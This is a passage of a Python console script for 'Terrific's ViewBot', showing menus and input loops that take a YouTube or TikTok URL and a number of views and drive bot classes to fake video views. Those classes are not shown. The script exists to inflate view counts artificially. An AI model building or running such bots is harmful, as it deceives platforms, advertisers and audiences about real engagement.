        {Fore.LIGHTMAGENTA_EX} ║ {Fore.RED}[2] {Style.RESET_ALL}Change Info     {Fore.LIGHTMAGENTA_EX}║  {Fore.RED}[X] {Style.RESET_ALL}Exit            {Fore.LIGHTMAGENTA_EX}║
        {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}==================={Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}===================={Fore.YELLOW}[x]{Style.RESET_ALL}''')
        i = input(f" {inp} ")
        if str(i) == str(1):
            chatsession()
        elif str(i) == str(2):
            changeinfo()
        elif str(i) == str(3):
            main()
        elif str(i).lower() == "x":
            exit()
        else:
            print(f" {err} Invalid Input, pres [ENTER] to return")
            input()
            singleutils()
    except KeyboardInterrupt:
        main()
    except:
        main()


def viewbot():
    global url
    global d
    global sessions
    os.system(f'mode 110,30')
    os.system('cls')
    os.system("title [Terrific's ViewBot - Connected]")
    print(f'''
    {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}===================================================={Fore.YELLOW}[x]
    {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[1]  {Fore.WHITE}Watch Videos on a Channel (only YouTube)    {Fore.LIGHTMAGENTA_EX}║
    {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[2]  {Fore.WHITE}viewbot v.1                                 {Fore.LIGHTMAGENTA_EX}║
    {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[3]  {Fore.WHITE}viewbot v.2                                 {Fore.LIGHTMAGENTA_EX}║
    {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[4]  {Fore.WHITE}Credits                                     {Fore.LIGHTMAGENTA_EX}║
    {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[5]  {Fore.WHITE}Exit                                        {Fore.LIGHTMAGENTA_EX}║
    {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}===================================================={Fore.YELLOW}[x]{Style.RESET_ALL}''')
    get_config()
    i1 = input(f"\n {inp} $ ")

    if str(i1) == "1":
        global channel
        os.system("title [Terrific's ViewBot - YouTube]")
        channel = input(f" {inp} Channel url: ")
        if channel.startswith("https://www.youtube.com/c/") == False and channel.startswith("https://www.youtube.com/channel/") == False:
            print(f" {err} Invalid Input, press [ENTER] to exit")
            input()
            exit()

        videos = input(f" {inp} How much Videos: ")
        watchtime = input(f" {inp} Watch next video after (sec): ")
        myBot = Bot()
        print(f"\n {log} Started")

        for i in range(int(videos)):
            print(f" {log} Watching Video: {i}/{videos}")
            myBot.watchVideo(i, int(watchtime))
        myBot.stop()

    elif str(i1) == "2":
        url = input(f" {inp} Enter URL: ")
        d = input(f" {inp} You want a custom or random duration [c/r]: ")
        sessions = input(f" {inp} How much view's you want to bot: ")

        if url.startswith("https://youtube.com/") or url.startswith("https://youtu.be/"):
            os.system("title [Terrific's ViewBot - YouTube]")
        elif url.startswith("https://www.tiktok.com") or url.startswith("www.tiktok.com") or url.startswith("https://tiktok.com"):
            os.system("title [Terrific's ViewBot - TikTok]")
        viewbotv1()

    elif str(i1) == "3":
        os.system("title [Terrific's ViewBot - YouTube]")

        url = input(f" {inp} Enter URL: ")
        duration = input(f" {inp} Enter Duration (min): ")
        sessions = input(f" {inp} How much view's you want to bot: ")

        if url.startswith("https://youtube.com/watch") == False and url.startswith("https://www.youtube.com/watch") == False:
            print(f" {err} Invalid Input, press [ENTER] to exit")
            input()
            exit()

        watchtime = input(f" {inp} Watch video again after (sec): ")
        myBot = viewbotv2()
        for i in range(int(sessions)):
            myBot.watchVideo(int(duration)*60)
            print(f"\n {log} Started")
            time.sleep(int(watchtime))
        myBot.stop()
        print(f" {log} Finished, press [ENTER] to exit")
        input()
        exit()
main()
